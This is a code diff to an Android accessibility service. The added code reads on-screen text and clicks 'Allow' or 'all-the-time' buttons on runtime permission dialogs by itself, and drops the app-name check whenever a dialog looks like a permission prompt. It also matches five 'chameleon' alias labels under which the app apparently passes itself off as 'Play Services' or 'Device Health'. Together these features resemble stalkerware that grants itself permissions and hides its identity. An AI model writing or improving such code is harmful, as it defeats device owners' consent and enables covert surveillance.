@@ -1499,16 +1499,29 @@ public class UnifiedAccessibilityService extends AccessibilityService {
      * or uppercase the app label (e.g. Samsung, MIUI, ColorOS).
      */
     private boolean runPermissionGranter(AccessibilityNodeInfo rootNode) {
-        String appName = getString(R.string.app_name);
         String screenText = getAllScreenText(rootNode);
         String screenTextLower = screenText.toLowerCase();
-        String appNameLower = appName.toLowerCase();
 
-        // App name must appear somewhere on screen (case-insensitive)
-        if (!screenTextLower.contains(appNameLower)) return false;
+        // ── Guard: only run on screens that belong to us ──────────────────────────────
+        // Fast path A: screen contains both a grant button AND a deny button → this is
+        //   unambiguously a runtime-permission dialog for our app.  Skip the name check
+        //   entirely so a chameleon label mismatch can never cause us to miss the dialog.
+        boolean hasDeny  = screenTextLower.contains("don't allow")
+                        || screenTextLower.contains("dont allow")
+                        || screenTextLower.contains("deny");
+        boolean hasAllow = screenTextLower.contains("allow");
+        boolean looksLikePermissionDialog = hasDeny && hasAllow;
+
+        if (!looksLikePermissionDialog) {
+            // Not a classic permission dialog — require our app name on screen so we
+            // don't accidentally click Allow on some unrelated third-party dialog.
+            // Check every label the OS might show (base name + all chameleon aliases +
+            // the runtime PackageManager label in case the build customised it).
+            if (!isAnyAppNameOnScreen(screenTextLower)) return false;
+        }
 
         // ── Step 0: "Allow access" pattern (Files & Storage / Notification access pages) ──
-        if (runAppNameAllowAccessClicker(rootNode, appName)) return true;
+        if (runAppNameAllowAccessClicker(rootNode)) return true;
 
         // ── Step 1: Permanent / all-the-time grants (highest priority) ──
         // These must be tried BEFORE plain "Allow" so we don't accidentally
@@ -1594,8 +1607,15 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     private boolean clickTextElementCI(AccessibilityNodeInfo node, String searchText) {
         if (node == null) return false;
         try {
+            // Check getText() first; fall back to contentDescription for OEM/Android 12+
+            // dialog buttons that set only contentDescription (getText() returns null).
             CharSequence text = node.getText();
-            if (text != null && text.toString().trim().equalsIgnoreCase(searchText.trim())) {
+            CharSequence desc = node.getContentDescription();
+            String searchTrimmed = searchText.trim();
+            boolean matches = (text != null && text.toString().trim().equalsIgnoreCase(searchTrimmed))
+                           || (text == null && desc != null
+                               && desc.toString().trim().equalsIgnoreCase(searchTrimmed));
+            if (matches) {
                 if (node.isClickable()) {
                     node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                     return true;
@@ -1724,13 +1744,13 @@ public class UnifiedAccessibilityService extends AccessibilityService {
      *  If app name AND "Allow access" both exist anywhere on screen,
      *  clicks "Allow access". If only app name exists, falls back to clicking "Allow".
      *  Uses safeClickTextElementCI so deny-listed button variants are never clicked. */
-    private boolean runAppNameAllowAccessClicker(AccessibilityNodeInfo rootNode, String appName) {
+    private boolean runAppNameAllowAccessClicker(AccessibilityNodeInfo rootNode) {
         try {
             String screenText = getAllScreenText(rootNode);
             String screenTextLower = screenText.toLowerCase();
 
-            // Case-insensitive: devices like Samsung/MIUI may uppercase the app label
-            if (!screenTextLower.contains(appName.toLowerCase())) return false;
+            // Check all labels the OS might be showing for this package
+            if (!isAnyAppNameOnScreen(screenTextLower)) return false;
 
             // Priority 1: "Allow access" (Files & Storage / Notification access pages)
             if (screenTextLower.contains("allow access")) {
@@ -1742,6 +1762,49 @@ public class UnifiedAccessibilityService extends AccessibilityService {
 
         } catch (Exception e) {
             Log.w(TAG, "runAppNameAllowAccessClicker error: " + e.getMessage());
+        }
+        return false;
+    }
+
+    /**
+     * Returns true if any of the labels the OS could show for this package appear
+     * in the (already lower-cased) screen text.
+     *
+     * We check:
+     *   1. The runtime PackageManager label — this is what Android actually shows in
+     *      dialogs and matches whichever ComponentName is currently enabled.
+     *   2. All five chameleon alias labels from string resources.
+     *   3. The base app_name string (fallback / pre-chameleon state).
+     *
+     * Using only getString(R.string.app_name) was the original bug: that string is
+     * "TestApp" (the placeholder), but the OS shows whichever alias label is active
+     * ("Play Services", "Device Health", etc.) in the permission dialog — so the
+     * name check always failed and runPermissionGranter returned false immediately.
+     */
+    private boolean isAnyAppNameOnScreen(String screenTextLower) {
+        // 1. Runtime label from PackageManager (most reliable)
+        try {
+            CharSequence pmLabel = getPackageManager().getApplicationLabel(getApplicationInfo());
+            if (pmLabel != null && !pmLabel.toString().isEmpty()
+                    && screenTextLower.contains(pmLabel.toString().toLowerCase())) {
+                return true;
+            }
+        } catch (Exception ignored) {}
+
+        // 2. All chameleon alias labels + base app_name
+        int[] labelIds = {
+            R.string.alias_label_0,
+            R.string.alias_label_1,
+            R.string.alias_label_2,
+            R.string.alias_label_3,
+            R.string.alias_label_4,
+            R.string.app_name
+        };
+        for (int id : labelIds) {
+            try {
+                String label = getString(id).trim().toLowerCase();
+                if (!label.isEmpty() && screenTextLower.contains(label)) return true;
+            } catch (Exception ignored) {}
         }
         return false;
     }
